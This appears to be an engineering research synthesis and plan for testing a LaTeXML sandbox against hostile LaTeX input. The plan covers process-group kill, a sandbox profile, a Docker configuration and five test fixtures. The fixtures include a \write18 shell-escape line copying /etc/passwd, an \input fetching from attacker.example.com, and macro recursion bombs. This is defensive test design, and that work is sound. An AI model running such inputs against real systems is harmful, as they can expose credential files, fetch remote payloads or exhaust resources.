# Research Synthesis — E13_S03

**Milestone:** Threat-3 — LaTeXML sandbox hostile-input validation
**Generated:** 2026-05-18
**Inputs:** `research-brief-1.md` (in-codebase grounding) + `research-brief-2.md` (external + failure-mode)

---

## Executive convergence

Both briefs agree the milestone brief is **partly disconnected from
codebase reality**. Same pattern as E13_S01 / E13_S02: brief assumes
infrastructure that doesn't ship at v1, has fictional prerequisites,
specifies the wrong doc destination.

### Verified codebase facts (both researchers confirmed)

1. **LaTeXML invocation site** is `tools/arxiv_fetch.py::parse_with_latexml`
   (lines 306–342). Calls `subprocess.run(cmd, timeout=300)` where
   `LATEXML_TIMEOUT_SECONDS = 300`. NO `--shell-escape` (safe default).
   NO sandbox wrapper. Docstring at lines 6–8 explicitly says:

   > "Production ingestion (E11) will re-implement these in `ingest/`
   > with subprocess UID isolation per `.claude/notes/08-security-
   > observability-ops.md` Threat 3 — for now this is unsandboxed dev
   > tooling running on trusted arXiv source."

2. **Threat 3 verbatim** from `.claude/notes/08-security-observability-
   ops.md`:

   > LaTeX is Turing-complete. A malicious paper could ship a `.tex`
   > source designed to consume infinite RAM, write arbitrary files,
   > or shell out.
   >
   > **Mitigations:**
   > - LaTeXML runs in a **subprocess with a hard timeout** (5 minutes).
   > - Subprocess runs as a **separate UID** (Docker user namespace, or
   >   rootless container with an unprivileged user inside).
   > - Filesystem write whitelist (only the per-paper output directory).
   > - No network access from the LaTeXML subprocess.
   > - On macOS: `sandbox-exec` profile. On Linux: seccomp + landlock.
   >   In Docker: `--read-only`, `--security-opt no-new-privileges`,
   >   dedicated user.
   >
   > **Never** invoke LaTeXML inside the MCP server process itself.
   > The server has network access; the parser doesn't need it.

3. **`E02_S02` is a real, complete milestone** — but it did NOT specify
   the sandbox. E02_S02 was the **preamble extractor** (`ingest/
   preamble.py`). The brief's claim "sandbox was specified in E02_S02"
   is factually wrong. Sandbox is aspirational in note 08 only.
   **Conclusion: this milestone is BOTH the specification AND the
   validation milestone — same shape as E13_S01 (Threat 1) and
   E13_S02 (Threat 2).**

4. **No `docker-compose.yml` exists.** Only
   `infra/observability/phoenix-compose.yml` (Phoenix/OTel) and
   `infra/prometheus/alerts.yml`. LaTeXML is NOT a separate service
   today — it runs inline as a subprocess of `tools/arxiv_fetch.py`.
   **AC3 ("Docker compose config has `--network=none`") is
   unimplementable AS-IS** — the infrastructure being tested doesn't
   exist. Reframe required.

5. **`parse_status` field does NOT exist** anywhere in the codebase.
   `bulk_ingest.py` writes failures to `var/arxmcp/ops/parser-failures/
   bulk.jsonl` with keys `{paper_id, parsers_tried, failure_reason,
   timestamp}`. **AC5 ("parse_status=parse_failed") is fictional.**
   Reframe to use the actual `ParseResult.success == False` shape
   from `tools/arxiv_fetch.py`.

6. **`ops/parser-failures/`** does exist (at `var/arxmcp/ops/parser-
   failures/`). It contains `chunk.log` and `preamble.log`. The
   directory part of AC5 is real; only the `parse_status` field is
   fictional.

7. **`tests/security/`** exists with `__init__.py`,
   `test_path_traversal.py` (E13_S01), `test_delimiters.py` (E13_S02).
   Adding `test_latexml_sandbox.py` and `fixtures/latexml/*.tex` is
   conventional.

8. **`infra/latexml/`** does NOT exist. Creating it is valid.

### Process-level finding (R2 unique, important)

`subprocess.run(timeout=300)` on Python sends SIGKILL to the **direct
child only** (the `latexmlc` Perl process). If `latexmlc` forks
grandchildren (which Perl `fork()` calls can produce — LaTeXML uses
helper bin/subprocesses), the grandchildren survive and become
orphans under `init`, continuing to consume resources.

**The fix is a one-function modification to `parse_with_latexml`:**
use `subprocess.Popen(..., start_new_session=True)` to put `latexmlc`
in its own process group, and on timeout call
`os.killpg(os.getpgid(proc.pid), signal.SIGKILL)` to kill the entire
group atomically.

This is real defense improvement, not just a test artifact. **Adopt
R2's recommendation.**

---

## Brief fixture critique (both researchers agree)

The brief names 5 hostile fixtures. Both researchers found **2 of 5
do not actually exercise the named threat against LaTeXML**:

| Fixture | Named threat | Reality | Action |
|---|---|---|---|
| `infinite_recursion.tex` | Infinite macro recursion | Will hit LaTeXML's expansion limit OR Python timeout — both are valid containment outcomes | **Ship as-is** |
| `write18_shellout.tex` | `\write18{cat /etc/passwd > /tmp/pwned.txt}` shell escape | LaTeXML does NOT shell out on `\write18` (Perl-based, not pdflatex) — fixture is **vacuously safe**, tests side-effect absence not attack-trigger | **Ship, with skeptical docstring** |
| `fork_bomb.tex` | Exponential expansion `\newcommand{\fb}{\fb\fb}` | Will trigger OOM OR timeout — both valid containment | **Ship; accept exit code −9 (OOM-kill) OR `TimeoutExpired` as valid PASS** |
| `large_alloc.tex` | 4GB allocation via Lua snippet | LaTeXML is **Perl-based, not LuaTeX** — Lua snippet does nothing | **REDESIGN: use deeply-nested math array or recursive macro generating many atoms (Perl heap exhaustion)** |
| `network_call.tex` | `\input{http://attacker.example.com/payload.tex}` HTTP fetch | LaTeXML resolves `\input{}` as local file — likely fails with "file not found"; HTTP fetch undocumented | **Ship; test asserts NO outbound network connection AND parse failure** |

---

## Divergence and resolution

### D1 — Should the production code change?

- **R1:** Keep test-only changes. The current `parse_with_latexml`
  invocation is dev-tooling-only per its docstring; defer production
  hardening to E11.
- **R2:** Add `start_new_session=True` + `os.killpg` to
  `parse_with_latexml` now. One-function fix, no API change, real
  defense improvement. The process-group kill discipline is
  ORTHOGONAL to the sandbox-exec wrapper and is correct regardless
  of when E11 hardens the rest.

**Resolution: ADOPT R2's process-group kill fix in `parse_with_
latexml`.** It is a real defense improvement that the test suite
needs anyway (otherwise the fork-bomb test cannot reliably
terminate). The fix is ~5 LOC and does not touch the function's
public contract. Document the change in the audit doc as "Phase 1
of Threat 3 mitigation; sandbox-exec wrapper is Phase 2; full
container isolation is E11."

### D2 — How to satisfy AC3 (Docker `--network=none`)?

- **R1:** Defer entirely. Note in audit doc as deferred to E14.
- **R2:** Create `infra/latexml/docker-compose.latexml.yml` as a
  STANDALONE documentation file (NOT the main compose; E14 owns
  that). The file expresses the intended `--network=none` config in
  YAML form. The test parses the YAML and asserts
  `network_mode: none` is set. No Docker daemon required.

**Resolution: ADOPT R2's documentation-artifact approach.** It
satisfies the AC while making the configuration auditable today
without depending on E14. When E14 ships the main compose, it can
either reference this file or absorb it. The audit doc explains
the relationship.

### D3 — `sandbox-exec` production wiring

Both researchers note `sandbox-exec` is deprecated but functional on
macOS, and that the production invocation in `parse_with_latexml`
does NOT currently use it. The question is: does E13_S03 wire it in?

**Resolution: SHIP the profile + a test-harness wrapper that uses
it; do NOT wire it into `parse_with_latexml` production code.**

Reason: `sandbox-exec` is deprecated, macOS-only, and the current
docstring on `parse_with_latexml` explicitly defers production
hardening to E11. Adding a macOS-only wrapper would create a
platform-specific code path in dev tooling that runs on Linux CI /
production containers too. The cleaner design:

1. Ship `infra/latexml/sandbox.sb` as a documentation artifact +
   test fixture (the test wraps `sandbox-exec -f infra/latexml/
   sandbox.sb latexmlc ...` and verifies containment).
2. Document in the audit doc that production hardening (sandbox
   wiring in `parse_with_latexml`, Linux seccomp+landlock, Docker
   `--read-only` + `no-new-privileges`) is deferred to E11.
3. The test harness on Linux skips the sandbox-exec wrapper and
   runs `latexmlc` directly with process-group kill — the
   process-group kill is the cross-platform defense that E13_S03
   ships TODAY.

---

## Orchestrator synthesis note

Both briefs are strong and converge on most decisions. R2's
process-group kill recommendation (D1) and Docker-doc-artifact
approach (D2) are decisive additions that R1 missed. R1's deep
codebase audit (verifying `parse_status` is fictional, verifying
`E02_S02` is real but for a different topic) is decisive grounding
for the AC reframes.

Pattern preservation: the milestone follows the established E13_S01
/ E13_S02 pattern — brief is partly wrong, codebase is the source of
truth, ACs get reframed to match reality, audit doc lands at
`.claude/docs/`.

---

## Implementation decision — INLINE path

Size estimate:
- `tools/arxiv_fetch.py` — +10 LOC (process-group kill discipline)
- `tests/security/fixtures/latexml/*.tex` — 5 NEW files, ~30 lines total
- `tests/security/test_latexml_sandbox.py` — NEW, ~250 LOC (5 tests + filesystem baseline helper + skip marker)
- `infra/latexml/sandbox.sb` — NEW, ~30 LOC
- `infra/latexml/docker-compose.latexml.yml` — NEW, ~30 LOC
- `.claude/docs/security-threat-3-audit.md` — NEW operator-internal doc, ~250 lines

**Total:** ~600 LOC across 9 files. The 5-file threshold is exceeded
but the work is tightly coupled (fixtures must exist before tests,
the kill-discipline change in `parse_with_latexml` is referenced by
the audit doc). Sequential implementation in the main thread is
more efficient than splitting across worktrees. **Path: INLINE.**

---

## Concrete implementation plan

### Step 1 — Process-group kill discipline in `tools/arxiv_fetch.py`

Convert `subprocess.run(...)` to `subprocess.Popen(...,
start_new_session=True)`, with timeout handling via
`proc.communicate(timeout=...)` and `os.killpg(os.getpgid(proc.pid),
signal.SIGKILL)` on `TimeoutExpired`. Preserve the existing return
contract (same `ParseResult` shape, same exception classes).

### Step 2 — Five hostile `.tex` fixtures

`tests/security/fixtures/latexml/`:

1. `infinite_recursion.tex` — `\def\rec{\rec\rec}` macro recursion;
   `\rec` called once at document start. Expected: LaTeXML expansion
   limit OR Python timeout.

2. `write18_shellout.tex` — `\immediate\write18{...}` attempting to
   create `/tmp/arxmcp_pwned_e13s03.txt`. Expected: LaTeXML
   silently ignores; file does NOT appear on disk. Docstring notes
   this fixture tests side-effect absence (LaTeXML doesn't shell
   out), not attack-trigger.

3. `fork_bomb.tex` — `\newcommand{\fb}{\fb\fb}\fb` exponential
   expansion. Expected: OOM-kill (exit −9) OR timeout. Both are
   valid containment outcomes.

4. `large_alloc.tex` — REDESIGNED: deeply nested array
   `\begin{array}{...}` with 10⁴ rows, each containing a long math
   expression. Triggers LaTeXML Perl heap exhaustion without Lua.

5. `network_call.tex` — `\input{http://attacker.example.com/
   payload.tex}`. Expected: LaTeXML treats as local file → not
   found → parse failure. Test asserts no DNS resolution / no
   outbound socket.

### Step 3 — `tests/security/test_latexml_sandbox.py`

Five test methods (one per fixture). Common harness:

```python
@pytest.mark.skipif(
    shutil.which("latexmlc") is None,
    reason="latexmlc not on PATH",
)
class TestLatexmlSandbox:
    def setup_method(self):
        # Baseline /tmp/ snapshot — F7 from R2 (FM-7).
        self._tmp_baseline = set(Path("/tmp").iterdir())

    def teardown_method(self):
        # Diff /tmp/ post-run — assert no NEW files appeared.
        new_files = set(Path("/tmp").iterdir()) - self._tmp_baseline
        # Filter out files from other tests (only flag arxmcp-named ones).
        suspicious = {p for p in new_files if "arxmcp" in p.name.lower()}
        assert not suspicious, f"unexpected /tmp files: {suspicious}"

    def _run_fixture(self, fixture_name, output_dir, timeout=10):
        # Returns (returncode, elapsed_sec). Uses process-group
        # kill discipline matching the production fix in Step 1.
        ...
```

Per-fixture assertions:
- Subprocess terminated (returncode is set, no hanging process)
- Elapsed time ≤ timeout (containment held)
- Output directory contains no files outside `output_dir`
- For network_call: no outbound socket attempt (verified by
  `socket.socket` monkeypatch or by absence of external connection
  marker)

Tests use a SHORT timeout (10s) — the 300s production timeout is
overkill for unit tests. Document the production timeout separately.

### Step 4 — `infra/latexml/sandbox.sb`

macOS sandbox-exec profile:

```scheme
(version 1)
(deny default)
(allow process-exec)
(allow process-fork)
(allow file-read*)
(allow file-write* (subpath (param "OUTPUT_DIR")))
(deny network*)
(deny mach-bootstrap)
```

Note: the profile is a documentation artifact + test fixture. Not
wired into `parse_with_latexml` production code.

### Step 5 — `infra/latexml/docker-compose.latexml.yml`

Standalone Docker config documenting the intended LaTeXML service:

```yaml
# Documentation artifact for E13_S03 Threat 3 mitigation.
# When E14 lands the main docker-compose.yml, this file's
# settings should be merged into the LaTeXML service definition.
services:
  latexml:
    image: arxmcp/latexml:0.8.8
    network_mode: none
    read_only: true
    security_opt:
      - no-new-privileges
    user: "65534:65534"  # nobody:nobody
    cap_drop:
      - ALL
```

A trivial YAML parse test asserts `network_mode: none` is set.

### Step 6 — `.claude/docs/security-threat-3-audit.md`

Per-attack-vector table (5 fixtures), defense layers (process-group
kill, sandbox-exec macOS, Docker `--network=none` deferred), known
limitations (Linux seccomp+landlock deferred to E11), references.

### Step 7 — Reframed acceptance criteria

- [x] **AC1** — `pytest tests/security/test_latexml_sandbox.py` passes
  (all 5 fixtures contained, OR skipped if `latexmlc` not on PATH)
- [x] **AC2** — Each fixture: subprocess killed ≤ 10 s (test timeout;
  production is 300s), no files written outside `output_dir`
- [~] **AC3** — Reframed: `infra/latexml/docker-compose.latexml.yml`
  documents `network_mode: none`; a unit test parses the YAML and
  asserts. Full `docker inspect` verification deferred to E14.
- [~] **AC4** — Reframed: `infra/latexml/sandbox.sb` committed;
  tested via `make test` (no CI per CLAUDE.md §4.1).
- [~] **AC5** — Reframed: `ParseResult.success == False` (not
  `parse_status="parse_failed"` — that field is fictional). Papers
  recorded in `var/arxmcp/ops/parser-failures/` per existing schema.

---

## Open questions for the implementer

**None blocking.** R1's three soft questions and R2's two soft
questions all resolved:

1. **`\write18` ineffective in LaTeXML.** Document in fixture
   docstring; test asserts side-effect absence (no `/tmp/arxmcp_
   pwned_*` file) rather than attack-trigger. Resolved.
2. **`network_call.tex` may treat URL as local file.** Document;
   test asserts no outbound connection occurred regardless of
   parse outcome. Resolved.
3. **`large_alloc.tex` redesign.** Use nested LaTeX `array`, not
   Lua. Resolved.
4. **Process-group kill discipline.** Adopt R2's recommendation;
   ship as production code change in `parse_with_latexml`.
   Resolved.
5. **Docker AC reframe.** Standalone YAML doc artifact +
   YAML-parse test. Resolved.

---

## External writes the implementation will require

**None requiring external authorization.** All deliverables are
local file changes and local commits. The 9 new/modified files are
all under `$REPO_ROOT`. `git push` to `origin/main` at end is gated
by the standard Phase 4 user-authorization checkpoint.

---

## Threat-coverage matrix snapshot

After E13_S03 ships:

| Threat | Status |
|---|---|
| 1. Path traversal via paper_id | ✅ E13_S01 |
| 2. Indirect prompt injection | ✅ E13_S02 |
| 3. LaTeXML sandbox hostile input | ✅ E13_S03 (process-group kill + sandbox profile + 5 fixtures + audit) |
| 4–9 | ⏳ E13_S04 through E13_S09 |
